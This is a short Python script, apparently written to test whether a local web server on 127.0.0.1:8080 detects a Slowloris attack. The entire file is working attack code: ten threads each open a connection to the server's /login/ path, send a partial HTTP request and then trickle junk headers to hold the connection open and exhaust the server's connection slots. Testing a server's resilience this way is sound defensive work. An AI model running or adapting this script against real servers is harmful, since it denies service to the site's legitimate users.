# slowloris_test.py
import socket
import time
import threading

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8080

def slowloris_attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(120)  # Increased timeout to allow slow sending
    try:
        sock.connect((TARGET_IP, TARGET_PORT))
        # Send initial request immediately
        sock.send(b"GET /login/ HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n")
        print(f"Started Slowloris from {threading.current_thread().name} at {time.ctime()}")

        # Send headers slowly to keep connection alive
        for i in range(10):
            sock.send(b"X-a: b\r\n")
            print(f"Sent header {i+1} from {threading.current_thread().name}")
            time.sleep(5)  # Reduced to 5s for faster testing, total 50s

        print(f"Keeping connection alive from {threading.current_thread().name}")
        time.sleep(60)  # Keep alive for detection
    except socket.error as e:
        print(f"Slowloris error from {threading.current_thread().name}: {e}")
    finally:
        sock.close()
        print(f"Closed connection from {threading.current_thread().name} at {time.ctime()}")

threads = []
for _ in range(10):
    t = threading.Thread(target=slowloris_attack)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print("Slowloris test complete.")